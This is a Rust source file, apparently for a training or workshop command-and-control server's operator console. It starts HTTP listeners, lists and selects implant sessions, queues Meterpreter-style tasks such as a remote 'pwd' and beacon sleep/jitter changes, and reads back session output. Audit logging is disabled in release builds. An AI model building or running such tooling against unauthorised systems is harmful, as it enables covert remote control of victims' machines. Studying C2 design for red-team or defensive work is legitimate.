use crate::tasking::AppState;

use core_defs::packer::MpTlv;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::sync::oneshot;

use std::net::SocketAddr;
use std::time::{SystemTime, UNIX_EPOCH};

const TLV_TYPE_COMMAND_ID: u32 = 0x0002_0001;
const COMMAND_ID_STD_PWD: u32 = 1001;

const COMMAND_ID_WORKSHOP_SET_BEACON: u32 = 9001;
const TLV_TYPE_WORKSHOP_SLEEP_MS: u32 = 0x2001_0001;
const TLV_TYPE_WORKSHOP_JITTER_PCT: u32 = 0x2001_0002;

fn tlv_uint(typ: u32, v: u32) -> MpTlv {
    MpTlv {
        typ,
        value: v.to_be_bytes().to_vec(),
    }
}

fn guid_to_hex(g: [u8; 16]) -> String {
    let mut out = String::with_capacity(32);
    for b in g {
        out.push_str(&format!("{:02x}", b));
    }
    out
}

fn parse_hex_guid(s: &str) -> Option<[u8; 16]> {
    let s = s.trim();
    if s.len() != 32 {
        return None;
    }
    let mut out = [0u8; 16];
    let bytes = s.as_bytes();
    for i in 0..16 {
        let hi = (bytes[i * 2] as char).to_digit(16)?;
        let lo = (bytes[i * 2 + 1] as char).to_digit(16)?;
        out[i] = ((hi << 4) | lo) as u8;
    }
    Some(out)
}

#[cfg(debug_assertions)]
fn now_ms() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis()
}

#[cfg(debug_assertions)]
fn audit(event: &str, detail: &str) {
    println!("ts_ms={} audit_event={} detail={}", now_ms(), event, detail);
}

#[cfg(not(debug_assertions))]
fn audit(_event: &str, _detail: &str) {}

pub async fn run(state: AppState, default_listener: Option<SocketAddr>) {
    let stdin = BufReader::new(tokio::io::stdin());
    let mut lines = stdin.lines();

    println!("operator ready: help");

    let mut listener_addr: Option<SocketAddr> = default_listener;
    let mut listener_task: Option<tokio::task::JoinHandle<()>> = None;
    let mut listener_stop: Option<oneshot::Sender<()>> = None;

    loop {
        tokio::select! {
            _ = tokio::signal::ctrl_c() => {
                break;
            }
            line = lines.next_line() => {
                let Ok(Some(line)) = line else {
                    break;
                };
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }

                audit("operator_cmd", line);

                let mut parts = line.split_whitespace();
                let cmd = parts.next().unwrap_or("");

                match cmd {
                    "help" => {
                        println!("status");
                        println!("listeners");
                        println!("listener set <ip:port>");
                        println!("listener start [ip:port]");
                        println!("listener stop");
                        println!("pollmode short");
                        println!("pollmode long <ms>");
                        println!("sessions");
                        println!("use <guidhex>");
                        println!("pwd");
                        println!("beacon <sleep_ms> <jitter_pct>");
                        println!("sleep <sleep_ms> <jitter_pct>");
                        println!("metrics");
                        println!("poll");
                        println!("quit");
                    }
                    "status" => {
                        let addr_txt = listener_addr
                            .map(|a| a.to_string())
                            .unwrap_or_else(|| "(unset)".into());
                        let running = listener_task.as_ref().map(|h| !h.is_finished()).unwrap_or(false);
                        let (long_poll, timeout_ms) = state.poll_mode().await;
                        let active = state
                            .get_active_guid()
                            .await
                            .map(guid_to_hex)
                            .unwrap_or_else(|| "(none)".into());
                        if long_poll {
                            println!(
                                "http addr={} running={} pollmode=long({}ms) active={}",
                                addr_txt, running, timeout_ms, active
                            );
                        } else {
                            println!(
                                "http addr={} running={} pollmode=short active={}",
                                addr_txt, running, active
                            );
                        }
                    }
                    "listeners" => {
                        let addr_txt = listener_addr.map(|a| a.to_string()).unwrap_or_else(|| "(unset)".into());
                        let running = listener_task.as_ref().map(|h| !h.is_finished()).unwrap_or(false);
                        println!("http addr={} running={}", addr_txt, running);
                    }
                    "listener" => {
                        let sub = parts.next().unwrap_or("");
                        match sub {
                            "set" => {
                                let Some(arg) = parts.next() else {
                                    println!("usage: listener set <ip:port>");
                                    continue;
                                };
                                match arg.parse::<SocketAddr>() {
                                    Ok(a) => {
                                        listener_addr = Some(a);
                                        audit("listener_set", &a.to_string());
                                        println!("listener addr set to {}", a);
                                    }
                                    Err(_) => println!("invalid addr"),
                                }
                            }
                            "start" => {
                                if let Some(arg) = parts.next() {
                                    if let Ok(a) = arg.parse::<SocketAddr>() {
                                        listener_addr = Some(a);
                                    } else {
                                        println!("invalid addr");
                                        continue;
                                    }
                                }

                                let Some(addr) = listener_addr else {
                                    println!("listener addr not set");
                                    continue;
                                };

                                let running = listener_task.as_ref().map(|h| !h.is_finished()).unwrap_or(false);
                                if running {
                                    println!("listener already running");
                                    continue;
                                }

                                let (tx, rx) = oneshot::channel::<()>();
                                listener_stop = Some(tx);
                                let st = state.clone();
                                listener_task = Some(tokio::spawn(async move {
                                    crate::listener::http::serve_with_shutdown(addr, st, async {
                                        let _ = rx.await;
                                    })
                                    .await;
                                }));
                                audit("listener_start", &addr.to_string());
                                println!("listener started on {}", addr);
                            }
                            "stop" => {
                                if let Some(tx) = listener_stop.take() {
                                    let _ = tx.send(());
                                }
                                if let Some(h) = listener_task.take() {
                                    let _ = h.await;
                                }
                                audit("listener_stop", "ok");
                                println!("listener stopped");
                            }
                            _ => {
                                println!("usage: listener <set|start|stop> ...");
                            }
                        }
                    }
                    "pollmode" => {
                        let sub = parts.next().unwrap_or("");
                        match sub {
                            "short" => {
                                state.set_poll_mode_short().await;
                                audit("pollmode", "short");
                                println!("pollmode=short");
                            }
                            "long" => {
                                let Some(ms) = parts.next() else {
                                    println!("usage: pollmode long <ms>");
                                    continue;
                                };
                                let Ok(ms) = ms.parse::<u64>() else {
                                    println!("invalid ms");
                                    continue;
                                };
                                state.set_poll_mode_long(ms).await;
                                audit("pollmode", &format!("long:{}", ms));
                                println!("pollmode=long timeout_ms={}", ms);
                            }
                            _ => println!("usage: pollmode <short|long>")
                        }
                    }
                    "sessions" => {
                        let sessions = state.mp_list_sessions().await;
                        if sessions.is_empty() {
                            println!("no sessions");
                        } else {
                            for g in sessions {
                                println!("{}", guid_to_hex(g));
                            }
                        }
                    }
                    "use" => {
                        let Some(arg) = parts.next() else {
                            println!("usage: use <guidhex>");
                            continue;
                        };
                        let Some(g) = parse_hex_guid(arg) else {
                            println!("invalid guid");
                            continue;
                        };
                        state.set_active_guid(g).await;
                        println!("active={}", guid_to_hex(g));
                    }
                    "pwd" => {
                        let Some(g) = state.get_active_guid().await else {
                            println!("no active session");
                            continue;
                        };
                        state.mp_queue_task(g, vec![tlv_uint(TLV_TYPE_COMMAND_ID, COMMAND_ID_STD_PWD)]).await;
                        audit("task_queue", "pwd");
                        println!("queued pwd for {}", guid_to_hex(g));
                    }
                    "beacon" | "sleep" => {
                        let Some(g) = state.get_active_guid().await else {
                            println!("no active session");
                            continue;
                        };
                        let Some(sleep_ms) = parts.next() else {
                            println!("usage: beacon <sleep_ms> <jitter_pct>");
                            continue;
                        };
                        let Some(jitter_pct) = parts.next() else {
                            println!("usage: beacon <sleep_ms> <jitter_pct>");
                            continue;
                        };
                        let Ok(sleep_ms) = sleep_ms.parse::<u32>() else {
                            println!("invalid sleep_ms");
                            continue;
                        };
                        let Ok(jitter_pct) = jitter_pct.parse::<u8>() else {
                            println!("invalid jitter_pct");
                            continue;
                        };
                        state
                            .mp_queue_task(
                                g,
                                vec![
                                    tlv_uint(TLV_TYPE_COMMAND_ID, COMMAND_ID_WORKSHOP_SET_BEACON),
                                    tlv_uint(TLV_TYPE_WORKSHOP_SLEEP_MS, sleep_ms),
                                    tlv_uint(TLV_TYPE_WORKSHOP_JITTER_PCT, jitter_pct as u32),
                                ],
                            )
                            .await;
                        audit(
                            "task_queue",
                            &format!("beacon sleep_ms={} jitter_pct={}", sleep_ms, jitter_pct),
                        );
                        println!("queued beacon update for {}", guid_to_hex(g));
                    }
                    "metrics" => {
                        #[cfg(debug_assertions)]
                        {
                            let m = state.metrics_snapshot().await;
                            println!(
                                "checkins={} results={} decode_failures={} tasks_queued={} tasks_delivered={}",
                                m.total_checkins, m.total_results, m.decode_failures, m.tasks_queued, m.tasks_delivered
                            );
                        }
                        #[cfg(not(debug_assertions))]
                        {
                            println!("metrics disabled in release");
                        }
                    }
                    "poll" => {
                        let Some(g) = state.get_active_guid().await else {
                            println!("no active session");
                            continue;
                        };
                        let outs = state.mp_take_outputs(g).await;
                        if outs.is_empty() {
                            println!("no output");
                        } else {
                            for o in outs {
                                println!("{}", o);
                            }
                        }
                    }
                    "quit" | "exit" => {
                        break;
                    }
                    _ => {
                        println!("unknown command");
                    }
                }
            }
        }
    }
}
